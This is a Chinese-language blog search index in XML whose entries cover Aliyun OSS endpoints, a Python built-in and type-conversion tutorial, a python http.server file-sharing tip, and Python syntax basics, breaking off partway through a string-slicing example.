align="left">oss-ap-southeast-7</td><td align="left">oss-ap-southeast-7.aliyuncs.com</td><td align="left">oss-ap-southeast-7-internal.aliyuncs.com</td></tr><tr><td align="left">印度（孟买）*</td><td align="left">oss-ap-south-1</td><td align="left">oss-ap-south-1.aliyuncs.com</td><td align="left">oss-ap-south-1-internal.aliyuncs.com</td></tr><tr><td align="left">德国（法兰克福）*</td><td align="left">oss-eu-central-1</td><td align="left">oss-eu-central-1.aliyuncs.com</td><td align="left">oss-eu-central-1-internal.aliyuncs.com</td></tr><tr><td align="left">英国（伦敦）</td><td align="left">oss-eu-west-1</td><td align="left">oss-eu-west-1.aliyuncs.com</td><td align="left">oss-eu-west-1-internal.aliyuncs.com</td></tr><tr><td align="left">阿联酋（迪拜）*</td><td align="left">oss-me-east-1</td><td align="left">oss-me-east-1.aliyuncs.com</td><td align="left">oss-me-east-1-internal.aliyuncs.com</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>oss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_func</title>
    <link href="/2024/11/11/dev/python3/python_func/"/>
    <url>/2024/11/11/dev/python3/python_func/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="type函数"><a href="#type函数" class="headerlink" title="type函数"></a>type函数</h3><p>输出变量类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a, b, c, d = <span class="hljs-number">1</span>, <span class="hljs-number">1.1</span>, <span class="hljs-literal">True</span>, <span class="hljs-number">4</span>+<span class="hljs-number">3j</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(b), <span class="hljs-built_in">type</span>(c), <span class="hljs-built_in">type</span>(d))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;bool&#x27;</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="isinstance函数"><a href="#isinstance函数" class="headerlink" title="isinstance函数"></a>isinstance函数</h3><p>判断变量类型</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a, b, c, d = <span class="hljs-number">1</span>, <span class="hljs-number">1.1</span>, <span class="hljs-literal">True</span>, <span class="hljs-number">4</span>+<span class="hljs-number">3j</span></span><br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">int</span>))</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">bool</span>))</span><br>False<br></code></pre></td></tr></table></figure><h4 id="type与isinstance对比"><a href="#type与isinstance对比" class="headerlink" title="type与isinstance对比"></a>type与isinstance对比</h4><p>type()不会认为子类是一种父类类型</p><p>isinstance()会认为子类是一种父类类型</p><h3 id="类型转换-转整型int"><a href="#类型转换-转整型int" class="headerlink" title="类型转换-转整型int"></a>类型转换-转整型int</h3><p><strong>int(值 [,base])</strong></p><p>将值转换为 int型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>strit = <span class="hljs-string">&quot;1111&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(strit)))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="类型转换-转浮点型float"><a href="#类型转换-转浮点型float" class="headerlink" title="类型转换-转浮点型float"></a>类型转换-转浮点型float</h3><p><strong>float(值)</strong></p><p>将值转换为浮点型</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">strit = <span class="hljs-string">&quot;1111&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))</span><br>&lt;class &#x27;str&#x27;&gt;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">float</span>(strit))</span><br>1111.0<br></code></pre></td></tr></table></figure><h3 id="类型转换-转字符串string"><a href="#类型转换-转字符串string" class="headerlink" title="类型转换-转字符串string"></a>类型转换-转字符串string</h3><p>str(对象)</p><p>将对象转换为字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(dicttest)<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(dicttest))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(dicttest))<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(dicttest)))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="类型转换-转字符串表达式"><a href="#类型转换-转字符串表达式" class="headerlink" title="类型转换-转字符串表达式"></a>类型转换-转字符串表达式</h3><p>repr(对象)</p><p>将对象转换为字符串表达式，也就是供解释器读取的形式</p><p>返回值为对象的字符串形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(dicttest))<br>&#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-built_in">repr</span>(dicttest)))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="类型转换-执行表达式"><a href="#类型转换-执行表达式" class="headerlink" title="类型转换-执行表达式"></a>类型转换-执行表达式</h3><p>eval(表达式)</p><p>计算表达式</p><p>返回表达式的值</p><p>注意：该函数利用不当存在代码注入的风险</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1+2&#x27;</span>)</span><br>1+2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;1+2&#x27;</span>))</span><br>3<br></code></pre></td></tr></table></figure><h3 id="类型转换-转元组tuple"><a href="#类型转换-转元组tuple" class="headerlink" title="类型转换-转元组tuple"></a>类型转换-转元组tuple</h3><p><strong>tuple(序列)</strong></p><p>将序列转换为tuple元组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(strit)<br><span class="hljs-number">1111</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">tuple</span>(strit))<br>(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="类型转换-转列表list"><a href="#类型转换-转列表list" class="headerlink" title="类型转换-转列表list"></a>类型转换-转列表list</h3><p><strong>list(序列)</strong></p><p>将序列转换为list列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(strit)<br><span class="hljs-number">1111</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(strit))<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(strit))<br>[<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="类型转换-转字典dict"><a href="#类型转换-转字典dict" class="headerlink" title="类型转换-转字典dict"></a>类型转换-转字典dict</h3><p><strong>dict(d)</strong></p><h3 id="类型转换-整数转ascii字符"><a href="#类型转换-整数转ascii字符" class="headerlink" title="类型转换-整数转ascii字符"></a>类型转换-整数转ascii字符</h3><p><strong>chr(值)</strong></p><p>值可以是 10 进制也可以是 16 进制的形式的数字，数字范围为 0 到 1,114,111 (16 进制为0x10FFFF)</p><p>返回整数值对应的ascii字符</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">inttest = <span class="hljs-number">97</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(inttest))</span><br>a<br></code></pre></td></tr></table></figure><h3 id="类型转换-字符转整数"><a href="#类型转换-字符转整数" class="headerlink" title="类型转换-字符转整数"></a>类型转换-字符转整数</h3><p><strong>ord(x)</strong></p><p>x为单个字符，如果x超过定义范围，返回TypeError异常</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">&gt;&gt;&gt; <span class="hljs-keyword">print</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;aa&#x27;</span>))<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;python-input-126&gt;&quot;</span>, line <span class="hljs-number">1</span>, in &lt;module&gt;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;aa&#x27;</span>))<br>          ~~~^^^^^^<br>TypeError: <span class="hljs-keyword">ord</span>() expected a character, but string of <span class="hljs-keyword">length</span> <span class="hljs-number">2</span> found<br></code></pre></td></tr></table></figure><p>将字符转换为对应的整数</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-string">&#x27;a&#x27;</span>))</span><br><span class="hljs-number">97</span><br></code></pre></td></tr></table></figure><h3 id="类型转换-整数转十六进制"><a href="#类型转换-整数转十六进制" class="headerlink" title="类型转换-整数转十六进制"></a>类型转换-整数转十六进制</h3><p><strong>hex(x)</strong></p><p>将十进制整数转换为十六进制，以字符串形式展示</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">97</span>)</span><br><span class="hljs-string">&#x27;0x61&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">255</span>)</span><br><span class="hljs-string">&#x27;0xff&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="类型转换-整数转八进制"><a href="#类型转换-整数转八进制" class="headerlink" title="类型转换-整数转八进制"></a>类型转换-整数转八进制</h3><p><strong>oct(x)</strong></p><p>将十进制整数转换为八进制，以字符串形式展示</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">oct</span>(<span class="hljs-number">97</span>)</span><br><span class="hljs-string">&#x27;0o141&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">oct</span>(<span class="hljs-number">255</span>)</span><br><span class="hljs-string">&#x27;0o377&#x27;</span><br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_tips</title>
    <link href="/2024/11/11/dev/python3/python_tips/"/>
    <url>/2024/11/11/dev/python3/python_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="启动http服务"><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h2><p>日常在进行文件下载的时候，会出现不同环境下载速度不同或者下载结果不同的情况，为了不同环境之间进行文件传输，可以使用python临时启动httpserver服务器。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>1）执行python命令的目录就是http服务的根目录</p><p>2）默认端口为 8000 ，可以在命令中指定</p><p>3）启动的服务为单线程</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>python2</p><p>python -m SimpleHTTPServer 3001</p><p>python3</p><p>python -m http.server 3001</p>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_base</title>
    <link href="/2024/11/11/dev/python3/python3_base/"/>
    <url>/2024/11/11/dev/python3/python3_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，python3源码文件以UTF-8编码，所有字符串均为unicode字符串</p><h3 id="设置编码"><a href="#设置编码" class="headerlink" title="设置编码"></a>设置编码</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># -<span class="hljs-emphasis">*- coding:utf-8 -*</span>-</span><br></code></pre></td></tr></table></figure><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>第一个字符必须是字母或下划线_</p><p>标识符组成为数字、大小写字母、下划线_</p><h3 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h3><p>保留字即关键字，不可用于标识符</p><p>保留字查询模块keyword</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> keyword<br><span class="hljs-built_in">print</span>(keyword.kwlist)<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>[<span class="hljs-string">&#x27;False&#x27;</span>, <span class="hljs-string">&#x27;None&#x27;</span>, <span class="hljs-string">&#x27;True&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;as&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-string">&#x27;async&#x27;</span>, <span class="hljs-string">&#x27;await&#x27;</span>, <span class="hljs-string">&#x27;break&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;continue&#x27;</span>, <span class="hljs-string">&#x27;def&#x27;</span>, <span class="hljs-string">&#x27;del&#x27;</span>, <span class="hljs-string">&#x27;elif&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;except&#x27;</span>, <span class="hljs-string">&#x27;finally&#x27;</span>, <span class="hljs-string">&#x27;for&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-string">&#x27;is&#x27;</span>, <span class="hljs-string">&#x27;lambda&#x27;</span>, <span class="hljs-string">&#x27;nonlocal&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;pass&#x27;</span>, <span class="hljs-string">&#x27;raise&#x27;</span>, <span class="hljs-string">&#x27;return&#x27;</span>, <span class="hljs-string">&#x27;try&#x27;</span>, <span class="hljs-string">&#x27;while&#x27;</span>, <span class="hljs-string">&#x27;with&#x27;</span>, <span class="hljs-string">&#x27;yield&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>单行注释 #</p><p>多行注释 ‘’’   ‘’’&#x2F; “””   “””</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&#x27;&#x27;&#x27;<br>多行注释<br>&#x27;&#x27;&#x27;<br><br>&quot;&quot;&quot;多行注释&quot;&quot;<br></code></pre></td></tr></table></figure><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><p>同一个代码块的语句必须包含相同的缩进空格数</p><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>可以用 \ 连接多行语句</p><p>[]、{}、()中的多行语句不能用\连接</p><h3 id="等待输入"><a href="#等待输入" class="headerlink" title="等待输入"></a>等待输入</h3><p>input()</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">input</span>(<span class="hljs-string">&quot;请准备输入～&quot;</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>请准备输入～<br></code></pre></td></tr></table></figure><h3 id="print输出"><a href="#print输出" class="headerlink" title="print输出"></a>print输出</h3><p>print()</p><p>默认换行</p><p>不换行需要在变量末尾加上 end&#x3D;””</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;a1&quot;</span><br><span class="hljs-selector-tag">b</span> = <span class="hljs-string">&quot;b1&quot;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b)</span></span><br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a, end=<span class="hljs-string">&quot;&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b, end=<span class="hljs-string">&quot;&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>a1<br>b1<br>a1b1%         <br></code></pre></td></tr></table></figure><h3 id="import-from-import"><a href="#import-from-import" class="headerlink" title="import&#x2F;from import"></a>import&#x2F;from import</h3><h4 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h4><p>import modulename</p><h4 id="导入模块单个函数"><a href="#导入模块单个函数" class="headerlink" title="导入模块单个函数"></a>导入模块单个函数</h4><p>from moudlename import funname</p><h4 id="导入模块多个函数"><a href="#导入模块多个函数" class="headerlink" title="导入模块多个函数"></a>导入模块多个函数</h4><p>from moudlename import funname1,funname2</p><h4 id="导入模块所有函数"><a href="#导入模块所有函数" class="headerlink" title="导入模块所有函数"></a>导入模块所有函数</h4><p>from moudlename import *</p><h1 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量不需要声明</p><p>变量必须赋值</p><p>等号&#x3D;进行赋值</p><h2 id="多变量赋值"><a href="#多变量赋值" class="headerlink" title="多变量赋值"></a>多变量赋值</h2><p>varname1 &#x3D; varname2 &#x3D; varname3 &#x3D; varvalue</p><p>varname3, varname4, varname5 &#x3D; varvalue3, varvalue4, varvalue5</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br>varname1 = varname2 = varname3 = <span class="hljs-string">&quot;varvalue&quot;</span><br><br>varname4, varname5, varname6 = <span class="hljs-string">&quot;varvalue4&quot;</span>, <span class="hljs-string">&quot;varvalue5&quot;</span>, <span class="hljs-string">&quot;varvalue6&quot;</span><br><br><span class="hljs-built_in">print</span>(varname1, varname2,varname3,varname4,varname5,varname6)<br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">➜  pythoncode <span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/Users/</span>admin<span class="hljs-regexp">/python/</span>pythoncode/<span class="hljs-number">1</span>.py<br>varvalue varvalue varvalue varvalue4 varvalue5 varvalue6<br></code></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>bool布尔类型</p><h4 id="不可变数据"><a href="#不可变数据" class="headerlink" title="不可变数据"></a>不可变数据</h4><h5 id="Number数字"><a href="#Number数字" class="headerlink" title="Number数字"></a>Number数字</h5><p>int</p><p>float</p><p>complex复数</p><p>注意：</p><p>1、True和False可以与数字相加，True&#x3D;&#x3D;1、False&#x3D;&#x3D;0返回True</p><p>2、数值的除法包含两个运算符：**&#x2F;** 返回一个浮点数，**&#x2F;&#x2F;** 返回一个整数</p><p>3、在混合计算时，Python会把整型转换成为浮点数</p><h6 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h6><p>int 的子类</p><p>两个值 True&#x2F;False</p><p>可以和其他数据类型比较，True等价为 1，False等价为0</p><p>所有非零的数字和非空的字符串、列表、元组等数据类型都视为 True，0、空字符串、空列表、空元组被视为False</p><h5 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串"></a>String字符串</h5><p>单引号’’或双引号””包含</p><p>使用反斜线\转义特殊字符</p><p>截取格式：变量名[开始下标:结束下标]，下标(索引)从 0 开始，-1为从末尾的开始位置</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = <span class="hljs-string">&quot;stringtest&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>])</span><br>tri<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[-<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>])</span><br>tes<br></code></pre></td></tr></table></figure><p>没有开始下标</p><p>没有结束下标，表示从开始位置到结束</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = <span class="hljs-string">&quot;stringtest&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[-<span class="hljs-number">5</span>:])</span><br>gtest<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[<span class="hljs-number">5</span>:])</span><br>gtest<br></code></pre></td></tr></table></figure><p>没有开始下标，表示从头到结束下标</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = <span class="hljs-string">&quot;stringtest&quot;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(a[:<span class="hljs-number">5</span>])</span><br>strin<br><span class="hljs-meta 